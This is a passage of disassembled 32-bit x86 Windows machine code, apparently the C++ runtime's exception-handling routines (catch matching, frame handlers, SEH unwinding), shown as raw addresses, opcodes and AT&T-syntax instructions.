  40384b:	e8 39 09 00 00       	call   0x404189
  403850:	e8 ce f2 ff ff       	call   0x402b23
  403855:	89 58 10             	mov    %ebx,0x10(%eax)
  403858:	e8 c6 f2 ff ff       	call   0x402b23
  40385d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403860:	83 7d 24 00          	cmpl   $0x0,0x24(%ebp)
  403864:	53                   	push   %ebx
  403865:	89 48 14             	mov    %ecx,0x14(%eax)
  403868:	8b 45 0c             	mov    0xc(%ebp),%eax
  40386b:	0f 45 45 24          	cmovne 0x24(%ebp),%eax
  40386f:	50                   	push   %eax
  403870:	e8 5d f8 ff ff       	call   0x4030d2
  403875:	57                   	push   %edi
  403876:	ff 75 14             	push   0x14(%ebp)
  403879:	ff 75 0c             	push   0xc(%ebp)
  40387c:	e8 07 06 00 00       	call   0x403e88
  403881:	57                   	push   %edi
  403882:	e8 c4 07 00 00       	call   0x40404b
  403887:	83 c4 10             	add    $0x10,%esp
  40388a:	50                   	push   %eax
  40388b:	e8 6c 05 00 00       	call   0x403dfc
  403890:	e8 ca 2c 00 00       	call   0x40655f
  403895:	cc                   	int3
  403896:	55                   	push   %ebp
  403897:	8b ec                	mov    %esp,%ebp
  403899:	83 ec 38             	sub    $0x38,%esp
  40389c:	53                   	push   %ebx
  40389d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4038a0:	81 3b 03 00 00 80    	cmpl   $0x80000003,(%ebx)
  4038a6:	0f 84 17 01 00 00    	je     0x4039c3
  4038ac:	56                   	push   %esi
  4038ad:	57                   	push   %edi
  4038ae:	e8 70 f2 ff ff       	call   0x402b23
  4038b3:	33 ff                	xor    %edi,%edi
  4038b5:	39 78 08             	cmp    %edi,0x8(%eax)
  4038b8:	74 46                	je     0x403900
  4038ba:	57                   	push   %edi
  4038bb:	ff 15 9c 20 41 00    	call   *0x41209c
  4038c1:	8b f0                	mov    %eax,%esi
  4038c3:	e8 5b f2 ff ff       	call   0x402b23
  4038c8:	39 70 08             	cmp    %esi,0x8(%eax)
  4038cb:	74 33                	je     0x403900
  4038cd:	81 3b 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%ebx)
  4038d3:	74 2b                	je     0x403900
  4038d5:	81 3b 52 43 43 e0    	cmpl   $0xe0434352,(%ebx)
  4038db:	74 23                	je     0x403900
  4038dd:	ff 75 24             	push   0x24(%ebp)
  4038e0:	ff 75 20             	push   0x20(%ebp)
  4038e3:	ff 75 18             	push   0x18(%ebp)
  4038e6:	ff 75 14             	push   0x14(%ebp)
  4038e9:	ff 75 10             	push   0x10(%ebp)
  4038ec:	ff 75 0c             	push   0xc(%ebp)
  4038ef:	53                   	push   %ebx
  4038f0:	e8 ae f6 ff ff       	call   0x402fa3
  4038f5:	83 c4 1c             	add    $0x1c,%esp
  4038f8:	85 c0                	test   %eax,%eax
  4038fa:	0f 85 c1 00 00 00    	jne    0x4039c1
  403900:	8b 45 18             	mov    0x18(%ebp),%eax
  403903:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403906:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403909:	39 78 0c             	cmp    %edi,0xc(%eax)
  40390c:	0f 86 b4 00 00 00    	jbe    0x4039c6
  403912:	ff 75 20             	push   0x20(%ebp)
  403915:	50                   	push   %eax
  403916:	ff 75 14             	push   0x14(%ebp)
  403919:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40391c:	ff 75 1c             	push   0x1c(%ebp)
  40391f:	50                   	push   %eax
  403920:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403923:	50                   	push   %eax
  403924:	e8 ab f5 ff ff       	call   0x402ed4
  403929:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40392c:	83 c4 18             	add    $0x18,%esp
  40392f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403932:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403935:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403938:	3b 55 e8             	cmp    -0x18(%ebp),%edx
  40393b:	0f 83 80 00 00 00    	jae    0x4039c1
  403941:	6b ca 14             	imul   $0x14,%edx,%ecx
  403944:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403947:	8b 00                	mov    (%eax),%eax
  403949:	8d 7d c8             	lea    -0x38(%ebp),%edi
  40394c:	6a 05                	push   $0x5
  40394e:	8b 70 10             	mov    0x10(%eax),%esi
  403951:	8b 45 1c             	mov    0x1c(%ebp),%eax
  403954:	03 f1                	add    %ecx,%esi
  403956:	59                   	pop    %ecx
  403957:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  403959:	39 45 c8             	cmp    %eax,-0x38(%ebp)
  40395c:	7f 4e                	jg     0x4039ac
  40395e:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  403961:	7f 49                	jg     0x4039ac
  403963:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  403966:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403969:	c1 e1 04             	shl    $0x4,%ecx
  40396c:	83 c0 f0             	add    $0xfffffff0,%eax
  40396f:	03 c1                	add    %ecx,%eax
  403971:	8b 48 04             	mov    0x4(%eax),%ecx
  403974:	85 c9                	test   %ecx,%ecx
  403976:	74 06                	je     0x40397e
  403978:	80 79 08 00          	cmpb   $0x0,0x8(%ecx)
  40397c:	75 2e                	jne    0x4039ac
  40397e:	f6 00 40             	testb  $0x40,(%eax)
  403981:	75 29                	jne    0x4039ac
  403983:	6a 00                	push   $0x0
  403985:	6a 01                	push   $0x1
  403987:	ff 75 24             	push   0x24(%ebp)
  40398a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40398d:	ff 75 20             	push   0x20(%ebp)
  403990:	51                   	push   %ecx
  403991:	6a 00                	push   $0x0
  403993:	50                   	push   %eax
  403994:	ff 75 18             	push   0x18(%ebp)
  403997:	ff 75 14             	push   0x14(%ebp)
  40399a:	ff 75 10             	push   0x10(%ebp)
  40399d:	ff 75 0c             	push   0xc(%ebp)
  4039a0:	53                   	push   %ebx
  4039a1:	e8 cc fa ff ff       	call   0x403472
  4039a6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4039a9:	83 c4 30             	add    $0x30,%esp
  4039ac:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4039af:	42                   	inc    %edx
  4039b0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4039b3:	83 c1 14             	add    $0x14,%ecx
  4039b6:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4039b9:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4039bc:	3b 55 e8             	cmp    -0x18(%ebp),%edx
  4039bf:	72 86                	jb     0x403947
  4039c1:	5f                   	pop    %edi
  4039c2:	5e                   	pop    %esi
  4039c3:	5b                   	pop    %ebx
  4039c4:	c9                   	leave
  4039c5:	c3                   	ret
  4039c6:	e8 94 2b 00 00       	call   0x40655f
  4039cb:	cc                   	int3
  4039cc:	55                   	push   %ebp
  4039cd:	8b ec                	mov    %esp,%ebp
  4039cf:	8b 55 08             	mov    0x8(%ebp),%edx
  4039d2:	53                   	push   %ebx
  4039d3:	56                   	push   %esi
  4039d4:	57                   	push   %edi
  4039d5:	8b 42 04             	mov    0x4(%edx),%eax
  4039d8:	85 c0                	test   %eax,%eax
  4039da:	74 76                	je     0x403a52
  4039dc:	8d 48 08             	lea    0x8(%eax),%ecx
  4039df:	80 39 00             	cmpb   $0x0,(%ecx)
  4039e2:	74 6e                	je     0x403a52
  4039e4:	f6 02 80             	testb  $0x80,(%edx)
  4039e7:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4039ea:	74 05                	je     0x4039f1
  4039ec:	f6 07 10             	testb  $0x10,(%edi)
  4039ef:	75 61                	jne    0x403a52
  4039f1:	8b 5f 04             	mov    0x4(%edi),%ebx
  4039f4:	33 f6                	xor    %esi,%esi
  4039f6:	3b c3                	cmp    %ebx,%eax
  4039f8:	74 30                	je     0x403a2a
  4039fa:	8d 43 08             	lea    0x8(%ebx),%eax
  4039fd:	8a 19                	mov    (%ecx),%bl
  4039ff:	3a 18                	cmp    (%eax),%bl
  403a01:	75 1a                	jne    0x403a1d
  403a03:	84 db                	test   %bl,%bl
  403a05:	74 12                	je     0x403a19
  403a07:	8a 59 01             	mov    0x1(%ecx),%bl
  403a0a:	3a 58 01             	cmp    0x1(%eax),%bl
  403a0d:	75 0e                	jne    0x403a1d
  403a0f:	83 c1 02             	add    $0x2,%ecx
  403a12:	83 c0 02             	add    $0x2,%eax
  403a15:	84 db                	test   %bl,%bl
  403a17:	75 e4                	jne    0x4039fd
  403a19:	8b c6                	mov    %esi,%eax
  403a1b:	eb 05                	jmp    0x403a22
  403a1d:	1b c0                	sbb    %eax,%eax
  403a1f:	83 c8 01             	or     $0x1,%eax
  403a22:	85 c0                	test   %eax,%eax
  403a24:	74 04                	je     0x403a2a
  403a26:	33 c0                	xor    %eax,%eax
  403a28:	eb 2b                	jmp    0x403a55
  403a2a:	f6 07 02             	testb  $0x2,(%edi)
  403a2d:	74 05                	je     0x403a34
  403a2f:	f6 02 08             	testb  $0x8,(%edx)
  403a32:	74 1a                	je     0x403a4e
  403a34:	8b 45 10             	mov    0x10(%ebp),%eax
  403a37:	f6 00 01             	testb  $0x1,(%eax)
  403a3a:	74 05                	je     0x403a41
  403a3c:	f6 02 01             	testb  $0x1,(%edx)
  403a3f:	74 0d                	je     0x403a4e
  403a41:	f6 00 02             	testb  $0x2,(%eax)
  403a44:	74 05                	je     0x403a4b
  403a46:	f6 02 02             	testb  $0x2,(%edx)
  403a49:	74 03                	je     0x403a4e
  403a4b:	33 f6                	xor    %esi,%esi
  403a4d:	46                   	inc    %esi
  403a4e:	8b c6                	mov    %esi,%eax
  403a50:	eb 03                	jmp    0x403a55
  403a52:	33 c0                	xor    %eax,%eax
  403a54:	40                   	inc    %eax
  403a55:	5f                   	pop    %edi
  403a56:	5e                   	pop    %esi
  403a57:	5b                   	pop    %ebx
  403a58:	5d                   	pop    %ebp
  403a59:	c3                   	ret
  403a5a:	55                   	push   %ebp
  403a5b:	8b ec                	mov    %esp,%ebp
  403a5d:	53                   	push   %ebx
  403a5e:	56                   	push   %esi
  403a5f:	57                   	push   %edi
  403a60:	ff 75 10             	push   0x10(%ebp)
  403a63:	e8 6f f0 ff ff       	call   0x402ad7
  403a68:	59                   	pop    %ecx
  403a69:	e8 b5 f0 ff ff       	call   0x402b23
  403a6e:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403a71:	33 f6                	xor    %esi,%esi
  403a73:	8b 55 08             	mov    0x8(%ebp),%edx
  403a76:	bb ff ff ff 1f       	mov    $0x1fffffff,%ebx
  403a7b:	bf 22 05 93 19       	mov    $0x19930522,%edi
  403a80:	39 70 20             	cmp    %esi,0x20(%eax)
  403a83:	75 22                	jne    0x403aa7
  403a85:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  403a8b:	74 1a                	je     0x403aa7
  403a8d:	81 3a 26 00 00 80    	cmpl   $0x80000026,(%edx)
  403a93:	74 12                	je     0x403aa7
  403a95:	8b 01                	mov    (%ecx),%eax
  403a97:	23 c3                	and    %ebx,%eax
  403a99:	3b c7                	cmp    %edi,%eax
  403a9b:	72 0a                	jb     0x403aa7
  403a9d:	f6 41 20 01          	testb  $0x1,0x20(%ecx)
  403aa1:	0f 85 ad 00 00 00    	jne    0x403b54
  403aa7:	f6 42 04 66          	testb  $0x66,0x4(%edx)
  403aab:	74 26                	je     0x403ad3
  403aad:	39 71 04             	cmp    %esi,0x4(%ecx)
  403ab0:	0f 84 9e 00 00 00    	je     0x403b54
  403ab6:	39 75 1c             	cmp    %esi,0x1c(%ebp)
  403ab9:	0f 85 95 00 00 00    	jne    0x403b54
  403abf:	51                   	push   %ecx
  403ac0:	ff 75 14             	push   0x14(%ebp)
  403ac3:	ff 75 0c             	push   0xc(%ebp)
  403ac6:	e8 bd 03 00 00       	call   0x403e88
  403acb:	83 c4 0c             	add    $0xc,%esp
  403ace:	e9 81 00 00 00       	jmp    0x403b54
  403ad3:	39 71 0c             	cmp    %esi,0xc(%ecx)
  403ad6:	75 1e                	jne    0x403af6
  403ad8:	8b 01                	mov    (%ecx),%eax
  403ada:	23 c3                	and    %ebx,%eax
  403adc:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  403ae1:	72 05                	jb     0x403ae8
  403ae3:	39 71 1c             	cmp    %esi,0x1c(%ecx)
  403ae6:	75 0e                	jne    0x403af6
  403ae8:	3b c7                	cmp    %edi,%eax
  403aea:	72 68                	jb     0x403b54
  403aec:	8b 41 20             	mov    0x20(%ecx),%eax
  403aef:	c1 e8 02             	shr    $0x2,%eax
  403af2:	a8 01                	test   $0x1,%al
  403af4:	74 5e                	je     0x403b54
  403af6:	81 3a 63 73 6d e0    	cmpl   $0xe06d7363,(%edx)
  403afc:	75 3a                	jne    0x403b38
  403afe:	83 7a 10 03          	cmpl   $0x3,0x10(%edx)
  403b02:	72 34                	jb     0x403b38
  403b04:	39 7a 14             	cmp    %edi,0x14(%edx)
  403b07:	76 2f                	jbe    0x403b38
  403b09:	8b 42 1c             	mov    0x1c(%edx),%eax
  403b0c:	8b 70 08             	mov    0x8(%eax),%esi
  403b0f:	85 f6                	test   %esi,%esi
  403b11:	74 25                	je     0x403b38
  403b13:	0f b6 45 24          	movzbl 0x24(%ebp),%eax
  403b17:	50                   	push   %eax
  403b18:	ff 75 20             	push   0x20(%ebp)
  403b1b:	ff 75 1c             	push   0x1c(%ebp)
  403b1e:	51                   	push   %ecx
  403b1f:	ff 75 14             	push   0x14(%ebp)
  403b22:	8b ce                	mov    %esi,%ecx
  403b24:	ff 75 10             	push   0x10(%ebp)
  403b27:	ff 75 0c             	push   0xc(%ebp)
  403b2a:	52                   	push   %edx
  403b2b:	ff 15 48 21 41 00    	call   *0x412148
  403b31:	ff d6                	call   *%esi
  403b33:	83 c4 20             	add    $0x20,%esp
  403b36:	eb 1f                	jmp    0x403b57
  403b38:	ff 75 20             	push   0x20(%ebp)
  403b3b:	ff 75 1c             	push   0x1c(%ebp)
  403b3e:	ff 75 24             	push   0x24(%ebp)
  403b41:	51                   	push   %ecx
  403b42:	ff 75 14             	push   0x14(%ebp)
  403b45:	ff 75 10             	push   0x10(%ebp)
  403b48:	ff 75 0c             	push   0xc(%ebp)
  403b4b:	52                   	push   %edx
  403b4c:	e8 a2 f9 ff ff       	call   0x4034f3
  403b51:	83 c4 20             	add    $0x20,%esp
  403b54:	33 c0                	xor    %eax,%eax
  403b56:	40                   	inc    %eax
  403b57:	5f                   	pop    %edi
  403b58:	5e                   	pop    %esi
  403b59:	5b                   	pop    %ebx
  403b5a:	5d                   	pop    %ebp
  403b5b:	c3                   	ret
  403b5c:	55                   	push   %ebp
  403b5d:	8b ec                	mov    %esp,%ebp
  403b5f:	5d                   	pop    %ebp
  403b60:	e9 f5 fe ff ff       	jmp    0x403a5a
  403b65:	55                   	push   %ebp
  403b66:	8b ec                	mov    %esp,%ebp
  403b68:	56                   	push   %esi
  403b69:	ff 75 08             	push   0x8(%ebp)
  403b6c:	8b f1                	mov    %ecx,%esi
  403b6e:	e8 2b 00 00 00       	call   0x403b9e
  403b73:	c7 06 cc 2c 41 00    	movl   $0x412ccc,(%esi)
  403b79:	8b c6                	mov    %esi,%eax
  403b7b:	5e                   	pop    %esi
  403b7c:	5d                   	pop    %ebp
  403b7d:	c2 04 00             	ret    $0x4
  403b80:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  403b87:	8b c1                	mov    %ecx,%eax
  403b89:	c7 41 08 00 00 00 00 	movl   $0x0,0x8(%ecx)
  403b90:	c7 41 04 d4 2c 41 00 	movl   $0x412cd4,0x4(%ecx)
  403b97:	c7 01 cc 2c 41 00    	movl   $0x412ccc,(%ecx)
  403b9d:	c3                   	ret
  403b9e:	55                   	push   %ebp
  403b9f:	8b ec                	mov    %esp,%ebp
  403ba1:	56                   	push   %esi
  403ba2:	8b f1                	mov    %ecx,%esi
  403ba4:	8d 46 04             	lea    0x4(%esi),%eax
  403ba7:	c7 06 ac 2c 41 00    	movl   $0x412cac,(%esi)
  403bad:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  403bb3:	50                   	push   %eax
  403bb4:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  403bbb:	8b 45 08             	mov    0x8(%ebp),%eax
  403bbe:	83 c0 04             	add    $0x4,%eax
  403bc1:	50                   	push   %eax
  403bc2:	e8 3d 05 00 00       	call   0x404104
  403bc7:	59                   	pop    %ecx
  403bc8:	59                   	pop    %ecx
  403bc9:	8b c6                	mov    %esi,%eax
  403bcb:	5e                   	pop    %esi
  403bcc:	5d                   	pop    %ebp
  403bcd:	c2 04 00             	ret    $0x4
  403bd0:	8d 41 04             	lea    0x4(%ecx),%eax
  403bd3:	c7 01 ac 2c 41 00    	movl   $0x412cac,(%ecx)
  403bd9:	50                   	push   %eax
  403bda:	e8 88 05 00 00       	call   0x404167
  403bdf:	59                   	pop    %ecx
  403be0:	c3                   	ret
  403be1:	55                   	push   %ebp
  403be2:	8b ec                	mov    %esp,%ebp
  403be4:	8b 45 08             	mov    0x8(%ebp),%eax
  403be7:	83 c0 04             	add    $0x4,%eax
  403bea:	50                   	push   %eax
  403beb:	8d 41 04             	lea    0x4(%ecx),%eax
  403bee:	50                   	push   %eax
  403bef:	e8 10 ea ff ff       	call   0x402604
  403bf4:	f7 d8                	neg    %eax
  403bf6:	59                   	pop    %ecx
  403bf7:	1a c0                	sbb    %al,%al
  403bf9:	59                   	pop    %ecx
  403bfa:	fe c0                	inc    %al
  403bfc:	5d                   	pop    %ebp
  403bfd:	c2 04 00             	ret    $0x4
  403c00:	55                   	push   %ebp
  403c01:	8b ec                	mov    %esp,%ebp
  403c03:	56                   	push   %esi
  403c04:	8b f1                	mov    %ecx,%esi
  403c06:	8d 46 04             	lea    0x4(%esi),%eax
  403c09:	c7 06 ac 2c 41 00    	movl   $0x412cac,(%esi)
  403c0f:	50                   	push   %eax
  403c10:	e8 52 05 00 00       	call   0x404167
  403c15:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  403c19:	59                   	pop    %ecx
  403c1a:	74 0a                	je     0x403c26
  403c1c:	6a 0c                	push   $0xc
  403c1e:	56                   	push   %esi
  403c1f:	e8 8c d2 00 00       	call   0x410eb0
  403c24:	59                   	pop    %ecx
  403c25:	59                   	pop    %ecx
  403c26:	8b c6                	mov    %esi,%eax
  403c28:	5e                   	pop    %esi
  403c29:	5d                   	pop    %ebp
  403c2a:	c2 04 00             	ret    $0x4
  403c2d:	6a 3c                	push   $0x3c
  403c2f:	68 f0 74 41 00       	push   $0x4174f0
  403c34:	e8 d7 dd ff ff       	call   0x401a10
  403c39:	8b 45 18             	mov    0x18(%ebp),%eax
  403c3c:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  403c3f:	33 ff                	xor    %edi,%edi
  403c41:	89 7d c0             	mov    %edi,-0x40(%ebp)
  403c44:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403c47:	8b 43 fc             	mov    -0x4(%ebx),%eax
  403c4a:	89 45 d0             	mov    %eax,-0x30(%ebp)
  403c4d:	8b 75 08             	mov    0x8(%ebp),%esi
  403c50:	ff 76 18             	push   0x18(%esi)
  403c53:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  403c56:	50                   	push   %eax
  403c57:	e8 fb f4 ff ff       	call   0x403157
  403c5c:	59                   	pop    %ecx
  403c5d:	59                   	pop    %ecx
  403c5e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  403c61:	e8 bd ee ff ff       	call   0x402b23
  403c66:	8b 40 10             	mov    0x10(%eax),%eax
  403c69:	89 45 c8             	mov    %eax,-0x38(%ebp)
  403c6c:	e8 b2 ee ff ff       	call   0x402b23
  403c71:	8b 40 14             	mov    0x14(%eax),%eax
  403c74:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  403c77:	e8 a7 ee ff ff       	call   0x402b23
  403c7c:	89 70 10             	mov    %esi,0x10(%eax)
  403c7f:	e8 9f ee ff ff       	call   0x402b23
  403c84:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403c87:	89 48 14             	mov    %ecx,0x14(%eax)
  403c8a:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403c8d:	33 c0                	xor    %eax,%eax
  403c8f:	40                   	inc    %eax
  403c90:	89 45 bc             	mov    %eax,-0x44(%ebp)
  403c93:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403c96:	ff 75 20             	push   0x20(%ebp)
  403c99:	ff 75 1c             	push   0x1c(%ebp)
  403c9c:	ff 75 18             	push   0x18(%ebp)
  403c9f:	ff 75 14             	push   0x14(%ebp)
  403ca2:	53                   	push   %ebx
  403ca3:	e8 9b f2 ff ff       	call   0x402f43
  403ca8:	83 c4 14             	add    $0x14,%esp
  403cab:	8b d8                	mov    %eax,%ebx
  403cad:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  403cb0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403cb3:	e9 9c 00 00 00       	jmp    0x403d54
  403cb8:	ff 75 ec             	push   -0x14(%ebp)
  403cbb:	e8 7e 01 00 00       	call   0x403e3e
  403cc0:	59                   	pop    %ecx
  403cc1:	c3                   	ret
  403cc2:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403cc5:	e8 59 ee ff ff       	call   0x402b23
  403cca:	33 ff                	xor    %edi,%edi
  403ccc:	89 78 20             	mov    %edi,0x20(%eax)
  403ccf:	8b 75 14             	mov    0x14(%ebp),%esi
  403cd2:	8b 46 08             	mov    0x8(%esi),%eax
  403cd5:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403cd8:	56                   	push   %esi
  403cd9:	ff 75 18             	push   0x18(%ebp)
  403cdc:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403cdf:	53                   	push   %ebx
  403ce0:	e8 f4 03 00 00       	call   0x4040d9
  403ce5:	83 c4 0c             	add    $0xc,%esp
  403ce8:	8b d0                	mov    %eax,%edx
  403cea:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403ced:	8b 46 10             	mov    0x10(%esi),%eax
  403cf0:	89 45 dc             	mov    %eax,-0x24(%ebp)
  403cf3:	8b cf                	mov    %edi,%ecx
  403cf5:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  403cf8:	39 7e 0c             	cmp    %edi,0xc(%esi)
  403cfb:	76 40                	jbe    0x403d3d
  403cfd:	6b c1 14             	imul   $0x14,%ecx,%eax
  403d00:	8b 5e 10             	mov    0x10(%esi),%ebx
  403d03:	3b 54 18 04          	cmp    0x4(%eax,%ebx,1),%edx
  403d07:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403d0a:	7e 28                	jle    0x403d34
  403d0c:	6b c1 14             	imul   $0x14,%ecx,%eax
  403d0f:	8b 75 dc             	mov    -0x24(%ebp),%esi
  403d12:	3b 54 30 08          	cmp    0x8(%eax,%esi,1),%edx
  403d16:	8b 75 14             	mov    0x14(%ebp),%esi
  403d19:	7f 19                	jg     0x403d34
  403d1b:	6b c1 14             	imul   $0x14,%ecx,%eax
  403d1e:	8b 4e 10             	mov    0x10(%esi),%ecx
  403d21:	8b 44 08 04          	mov    0x4(%eax,%ecx,1),%eax
  403d25:	40                   	inc    %eax
  403d26:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403d29:	8b 55 d8             	mov    -0x28(%ebp),%edx
  403d2c:	8b 14 c2             	mov    (%edx,%eax,8),%edx
  403d2f:	89 55 e0             	mov    %edx,-0x20(%ebp)
  403d32:	eb 09                	jmp    0x403d3d
  403d34:	41                   	inc    %ecx
  403d35:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  403d38:	3b 4e 0c             	cmp    0xc(%esi),%ecx
  403d3b:	72 c0                	jb     0x403cfd
  403d3d:	52                   	push   %edx
  403d3e:	56                   	push   %esi
  403d3f:	57                   	push   %edi
  403d40:	53                   	push   %ebx
  403d41:	e8 5a 01 00 00       	call   0x403ea0
  403d46:	83 c4 10             	add    $0x10,%esp
  403d49:	8b df                	mov    %edi,%ebx
  403d4b:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  403d4e:	89 7d fc             	mov    %edi,-0x4(%ebp)
  403d51:	8b 75 08             	mov    0x8(%ebp),%esi
  403d54:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403d5b:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%ebp)
  403d62:	e8 1a 00 00 00       	call   0x403d81
  403d67:	8b c3                	mov    %ebx,%eax
  403d69:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403d6c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403d73:	59                   	pop    %ecx
  403d74:	5f                   	pop    %edi
  403d75:	5e                   	pop    %esi
  403d76:	5b                   	pop    %ebx
  403d77:	c9                   	leave
  403d78:	c3                   	ret
  403d79:	33 ff                	xor    %edi,%edi
  403d7b:	8b 75 08             	mov    0x8(%ebp),%esi
  403d7e:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  403d81:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403d84:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403d87:	89 41 fc             	mov    %eax,-0x4(%ecx)
  403d8a:	ff 75 cc             	push   -0x34(%ebp)
  403d8d:	e8 e9 f3 ff ff       	call   0x40317b
  403d92:	59                   	pop    %ecx
  403d93:	e8 8b ed ff ff       	call   0x402b23
  403d98:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  403d9b:	89 48 10             	mov    %ecx,0x10(%eax)
  403d9e:	e8 80 ed ff ff       	call   0x402b23
  403da3:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  403da6:	89 48 14             	mov    %ecx,0x14(%eax)
  403da9:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  403daf:	75 4a                	jne    0x403dfb
  403db1:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  403db5:	75 44                	jne    0x403dfb
  403db7:	81 7e 14 20 05 93 19 	cmpl   $0x19930520,0x14(%esi)
  403dbe:	74 12                	je     0x403dd2
  403dc0:	81 7e 14 21 05 93 19 	cmpl   $0x19930521,0x14(%esi)
  403dc7:	74 09                	je     0x403dd2
  403dc9:	81 7e 14 22 05 93 19 	cmpl   $0x19930522,0x14(%esi)
  403dd0:	75 29                	jne    0x403dfb
  403dd2:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  403dd6:	75 23                	jne    0x403dfb
  403dd8:	85 db                	test   %ebx,%ebx
  403dda:	74 1f                	je     0x403dfb
  403ddc:	ff 76 18             	push   0x18(%esi)
  403ddf:	e8 69 e9 ff ff       	call   0x40274d
  403de4:	59                   	pop    %ecx
  403de5:	85 c0                	test   %eax,%eax
  403de7:	74 12                	je     0x403dfb
  403de9:	39 7d bc             	cmp    %edi,-0x44(%ebp)
  403dec:	0f 95 c0             	setne  %al
  403def:	0f b6 c0             	movzbl %al,%eax
  403df2:	50                   	push   %eax
  403df3:	56                   	push   %esi
  403df4:	e8 47 e8 ff ff       	call   0x402640
  403df9:	59                   	pop    %ecx
  403dfa:	59                   	pop    %ecx
  403dfb:	c3                   	ret
  403dfc:	6a 04                	push   $0x4
  403dfe:	b8 77 10 41 00       	mov    $0x411077,%eax
  403e03:	e8 63 d0 00 00       	call   0x410e6b
  403e08:	e8 16 ed ff ff       	call   0x402b23
  403e0d:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  403e11:	75 20                	jne    0x403e33
  403e13:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403e1a:	e8 9d 02 00 00       	call   0x4040bc
  403e1f:	e8 ff ec ff ff       	call   0x402b23
  403e24:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e27:	6a 00                	push   $0x0
  403e29:	6a 00                	push   $0x0
  403e2b:	89 48 1c             	mov    %ecx,0x1c(%eax)
  403e2e:	e8 56 03 00 00       	call   0x404189
  403e33:	e8 27 27 00 00       	call   0x40655f
  403e38:	cc                   	int3
  403e39:	cc                   	int3
  403e3a:	cc                   	int3
  403e3b:	cc                   	int3
  403e3c:	cc                   	int3
  403e3d:	cc                   	int3
  403e3e:	55                   	push   %ebp
  403e3f:	8b ec                	mov    %esp,%ebp
  403e41:	8b 45 08             	mov    0x8(%ebp),%eax
  403e44:	8b 00                	mov    (%eax),%eax
  403e46:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  403e4c:	75 36                	jne    0x403e84
  403e4e:	83 78 10 03          	cmpl   $0x3,0x10(%eax)
  403e52:	75 30                	jne    0x403e84
  403e54:	81 78 14 20 05 93 19 	cmpl   $0x19930520,0x14(%eax)
  403e5b:	74 12                	je     0x403e6f
  403e5d:	81 78 14 21 05 93 19 	cmpl   $0x19930521,0x14(%eax)
  403e64:	74 09                	je     0x403e6f
  403e66:	81 78 14 22 05 93 19 	cmpl   $0x19930522,0x14(%eax)
  403e6d:	75 15                	jne    0x403e84
  403e6f:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  403e73:	75 0f                	jne    0x403e84
  403e75:	e8 a9 ec ff ff       	call   0x402b23
  403e7a:	33 c9                	xor    %ecx,%ecx
  403e7c:	41                   	inc    %ecx
  403e7d:	89 48 20             	mov    %ecx,0x20(%eax)
  403e80:	8b c1                	mov    %ecx,%eax
  403e82:	5d                   	pop    %ebp
  403e83:	c3                   	ret
  403e84:	33 c0                	xor    %eax,%eax
  403e86:	5d                   	pop    %ebp
  403e87:	c3                   	ret
  403e88:	55                   	push   %ebp
  403e89:	8b ec                	mov    %esp,%ebp
  403e8b:	6a ff                	push   $0xffffffff
